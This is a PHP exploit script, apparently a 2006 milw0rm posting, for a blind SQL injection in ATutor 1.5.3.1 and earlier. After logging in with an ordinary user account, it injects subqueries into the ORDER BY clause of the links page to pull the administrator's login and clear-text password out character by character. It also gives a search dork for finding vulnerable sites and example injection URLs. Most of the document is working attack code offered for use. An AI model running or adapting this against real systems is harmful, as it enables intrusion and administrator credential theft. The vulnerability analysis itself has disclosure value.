#!/usr/bin/php -q -d short_open_tag=on
<?
echo "ATutor <= 1.5.3.1 'links' blind SQL injection / admin credentials disclosure\n";
echo "by rgod rgod@autistici.org\n";
echo "site: http://retrogod.altervista.org\n";
echo "dork, version specific: \"Web site engine's code is copyright\"  \"2001-2006 ATutor\" \"About ATutor\"\n\n";

/*
- works regardless of php.ini settings
- with Mysql >= 4.1 (allowing SELECT subqueries for ORDER BY statements)
  see http://dev.mysql.com/doc/refman/5.0/en/subqueries.html
- with at least 2 links in at_links table
*/

if ($argc<5) {
echo "Usage: php ".$argv[0]." host path user pass OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to ATutor\r\n";
echo "user/pass: you need a valid simple user account\r\n";
echo "Options:\r\n";
echo "   -T[prefix]   specify a table prefix different from default (at_)\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Example:\r\n";
echo "php ".$argv[0]." localhost /atutor/ username password\r\n";
echo "php ".$argv[0]." localhost /atutor/ username password -Tatutor_\r\n";
die;
}
/*
software site: http://www.atutor.ca/

vulnerable code in /links/index.php at lines 92-100
...
//get links
$groups = implode(',', $_SESSION['groups']);

if (!empty($groups)) {
	$sql = "SELECT * FROM ".TABLE_PREFIX."links L INNER JOIN ".TABLE_PREFIX."links_categories C USING (cat_id) WHERE ((owner_id=$_SESSION[course_id] AND owner_type=".LINK_CAT_COURSE.") OR (owner_id IN ($groups) AND owner_type=".LINK_CAT_GROUP.")) AND L.Approved=1 AND $search AND $cat_sql ORDER BY $col $order";
} else {
	$sql = "SELECT * FROM ".TABLE_PREFIX."links L INNER JOIN ".TABLE_PREFIX."links_categories C USING (cat_id) WHERE (owner_id=$_SESSION[course_id] AND owner_type=".LINK_CAT_COURSE.") AND L.Approved=1 AND $search AND $cat_sql ORDER BY $col $order";
}
$result = mysql_query($sql, $db);
...

with MySQL >= 4.1 you can inject a subquery after the ORDER BY statement, ex:

http://[target]/[path_to_atutor]/links/index.php?desc=(SELECT(IF((ASCII(SUBSTRING(password,1,1))=101),LinkName,Description))FROM%20at_admins)%20DESC%20LIMIT%202/*
http://[target]/[path_to_atutor]/links/index.php?asc=(SELECT(IF((ASCII(SUBSTRING(login,1,1))=102),LinkName,Description))FROM%20at_admins)%20DESC%20LIMIT%202/*

query becomes like this:

SELECT * FROM AT_links L INNER JOIN AT_links_categories C USING (cat_id) WHERE (owner_id=1 AND owner_type=1) AND L.Approved=1 AND 1 AND 1 ORDER BY (SELECT(IF((ASCII(SUBSTRING(login,1,1))=101),LinkName,Description))FROM at_admins) DESC LIMIT 2/* desc

so you can ask true/false questions to the database about the admin username/clear text password
you will see results in the way links are ordered at screen
You need at least two rows in at_links table
Other queries may be vulnerable to this kind of injection, since ORDER BY statements
are not checked at all...
This may hide undisclosed vulnerabilities in a lot of apps, I suppose...
					                                      */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$user=$argv[3];
$pass=$argv[4];
$prefix="at_";
$proxy="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$packet ="GET ".$p."login.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
$temp=explode("password.value + \"",$html);
$temp2=explode("\"",$temp[1]);
$what=$temp2[0];
echo "salt -> ".$what."\r\n";

$data ="form_login_action=true";
$data.="&form_course_id=0";
$data.="&form_password_hidden=".sha1($pass.$what);
$data.="&form_login=".$user;
$data.="&form_password=";
$data.="&submit=Login";
$packet ="POST ".$p."login.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
$packet ="GET ".$p."bounce.php?course=1 HTTP/1.0\r\n";//it seems you have to browse some page before to go to links panel
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
echo "cookie -> ".$cookie."\r\n";

$j=1;
$my_password="";
while (!strstr($my_password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
$sql="(SELECT(IF((ASCII(SUBSTRING(password,$j,1))=".$i."),LinkName,Description))FROM/**/".$prefix."admins)/**/DESC/**/LIMIT/**/2/*";
echo "sql -> ".$sql."\r\n";
$sql=urlencode($sql);
$packet ="GET ".$p."links/index.php?desc=$sql HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("<tr onmousedown=\"document.form['",$html);
$temp2=explode("']",$temp[1]);
$my_check=$temp2[0];
echo "check -> ".$my_check."\r\n";
if ($my_check=="m1") {$my_password.=chr($i);echo "password -> ".$my_password."[???]\r\n";sleep(2);break;}
elseif ($my_check=="m2") {continue;}
elseif ($my_check=="") {die("Exploit failed, maybe wrong table prefix or simply failed to login...");}
if ($i==255) {die("Exploit failed...");}
}
$j++;
}

$j=1;
$my_admin="";
while (!strstr($my_admin,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
$sql="(SELECT(IF((ASCII(SUBSTRING(login,$j,1))=".$i."),LinkName,Description))FROM/**/".$prefix."admins)/**/DESC/**/LIMIT/**/2/*";
echo "sql -> ".$sql."\r\n";
$sql=urlencode($sql);
$packet ="GET ".$p."links/index.php?desc=$sql HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("<tr onmousedown=\"document.form['",$html);
$temp2=explode("']",$temp[1]);
$my_check=$temp2[0];
echo "check -> ".$my_check."\r\n";
if ($my_check=="m1") {$my_admin.=chr($i);echo "admin -> ".$my_admin."[???]\r\n";sleep(2);break;}
elseif ($my_check=="m2") {continue;}
if ($i==255) {die("Exploit failed...");}
}
$j++;
}
echo "----------------------------------------------------------\n";
echo "admin                 -> ".$my_admin."\n";
echo "password (clear text) -> ".$my_password."\n";
echo "----------------------------------------------------------\n";
?>

# milw0rm.com [2006-07-30]
